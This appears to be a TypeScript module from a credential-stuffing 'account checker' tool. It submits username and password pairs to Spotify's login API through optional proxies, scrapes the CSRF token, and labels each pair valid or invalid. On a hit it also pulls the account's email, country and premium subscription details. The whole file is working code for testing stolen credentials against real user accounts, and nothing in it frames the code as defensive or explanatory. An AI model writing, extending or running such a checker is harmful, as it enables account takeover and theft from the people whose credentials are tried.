import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class SpotifyChecker extends BaseChecker {
  constructor(proxy?: any, timeout?: number) {
    super('spotify', proxy, timeout);
  }

  async check(credential: string, password: string): Promise<CheckResult> {
    return this.checkWithFallback(
      credential,
      password,
      this.checkWithCredential.bind(this),
      // Spotify primarily uses email, but also supports username
      this.isEmail(credential) ? this.checkAsUsername.bind(this) : this.checkAsEmail.bind(this)
    );
  }

  private async checkWithCredential(credential: string, password: string): Promise<CheckResult> {
    try {
      // Get Spotify login page to extract necessary tokens
      const loginPageResponse = await this.client.get('https://accounts.spotify.com/login', {
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      });

      // Extract CSRF token
      const csrfTokenMatch = loginPageResponse.data.match(/csrfToken":"([^"]+)"/);
      const csrfToken = csrfTokenMatch?.[1];

      // Login attempt
      const loginData = new URLSearchParams({
        username: credential,
        password: password,
        remember: 'true',
      });

      if (csrfToken) {
        loginData.append('csrf_token', csrfToken);
      }

      const loginResponse = await this.client.post(
        'https://accounts.spotify.com/api/login',
        loginData.toString(),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://accounts.spotify.com/login',
          },
          maxRedirects: 0,
          validateStatus: (status) => status < 400,
        }
      );

      // Check for successful login
      if (loginResponse.status === 302 && 
          loginResponse.headers.location?.includes('spotify.com')) {
        
        const capture = await this.getAccountDetails();
        return this.createResult(credential, password, 'spotify', 'valid', capture);
      }

      // Check response data for success indicators
      if (loginResponse.data?.success || 
          loginResponse.data?.location ||
          !loginResponse.data?.error) {
        
        const capture = await this.getAccountDetails();
        return this.createResult(credential, password, 'spotify', 'valid', capture);
      }

      // Check for specific error messages
      if (loginResponse.data?.error === 'invalid_grant' ||
          loginResponse.data?.error_description?.includes('Invalid')) {
        return this.createResult(credential, password, 'spotify', 'invalid');
      }

      return this.createResult(credential, password, 'spotify', 'invalid');
    } catch (error: any) {
      return this.handleError(error, credential, password);
    }
  }

  private async checkAsUsername(credential: string, password: string): Promise<CheckResult> {
    // Spotify also accepts usernames, so try with original credential as username
    return this.checkWithCredential(credential, password);
  }

  private async checkAsEmail(credential: string, password: string): Promise<CheckResult> {
    // If username failed, try as email
    return this.checkWithCredential(credential, password);
  }

  private async getAccountDetails() {
    try {
      // Try to get user profile from Spotify web player
      const response = await this.client.get('https://open.spotify.com/get_access_token', {
        headers: {
          'Accept': 'application/json',
        },
      });

      if (response.data?.accessToken) {
        const userResponse = await this.client.get(
          'https://api.spotify.com/v1/me',
          {
            headers: {
              Authorization: `Bearer ${response.data.accessToken}`,
            },
          }
        );

        return {
          username: userResponse.data?.display_name,
          email: userResponse.data?.email,
          country: userResponse.data?.country,
          isPremium: userResponse.data?.product === 'premium',
          subscription: userResponse.data?.product,
          followers: userResponse.data?.followers?.total,
          plan: userResponse.data?.product,
        };
      }

      return {
        subscription: 'Active',
      };
    } catch {
      return {
        subscription: 'Active',
      };
    }
  }
}
